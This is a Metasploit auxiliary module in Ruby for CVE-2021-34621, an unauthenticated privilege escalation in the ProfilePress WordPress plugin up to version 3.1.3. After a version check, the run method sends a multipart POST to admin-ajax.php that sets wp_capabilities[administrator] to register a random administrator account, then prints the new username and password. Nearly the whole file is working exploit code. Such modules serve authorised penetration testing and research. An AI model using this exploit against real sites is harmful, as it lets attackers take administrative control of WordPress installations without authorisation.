##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'WordPress Plugin ProfilePress 3.1.3 - Privilege Escalation (Unauthenticated)',
      'Description' => %q{
        A vulnerability in the user registration component found in the ~/src/Classes/RegistrationAuth.php file
        of the ProfilePress WordPress plugin made it possible for users to register on sites as an administrator.
        This issue affects versions 3.0.0 - 3.1.3.},
      'References' =>
        [
          ['CVE', 'CVE-2021-34621'],
          ['URL', 'https://wordpress.org/plugins/wp-user-avatar/']
        ],
      'Author' =>
        [
          'Numan Rajkotiya', # Vulnerability discovery
          'ThienNV - SunCSR Team' # Metasploit module
        ],
      'DisclosureDate' => 'Oct 20 2021',
      'License' => MSF_LICENSE
      ))
  end

  def check
    check_plugin_version_from_readme('wp-user-avatar', '3.1.3')
  end
  
  def run
    print_status('Registering a admin')

    #generate username, password, email admin
    email = "#{Rex::Text.rand_text_alpha(8)}@#{Rex::Text.rand_text_alpha(4)}.com"
    username = "#{Rex::Text.rand_text_alpha(8)}"
    password = "#{Rex::Text.rand_text_alpha(8)}"

    data = Rex::MIME::Message.new
    data.add_part('pp_ajax_signup', nil, nil, 'form-data; name="action"')
    data.add_part(username, nil, nil, 'form-data; name="reg_username"')
    data.add_part(email, nil, nil, 'form-data; name="reg_email"')
    data.add_part(password, nil, nil, 'form-data; name="reg_password"')
    data.add_part("1", nil, nil, 'form-data; name="reg_password_present"')
    data.add_part(username, nil, nil, 'form-data; name="reg_first_name"')
    data.add_part("1", nil, nil, 'form-data; name="wp_capabilities[administrator]"')
    post_data = data.to_s

    # Create admin user
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path ,'wp-admin', 'admin-ajax.php'),
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => post_data
    )
    
    if res && res.code == 200 && res.body.include?('Registration successful')
      print_good('Registration successful.')
      print_status("Username: #{username}")
      print_status("Password: #{password}")
    else
      fail_with(Failure::Unknown, 'Sorry, Cannot create user.')
    end
  end
end
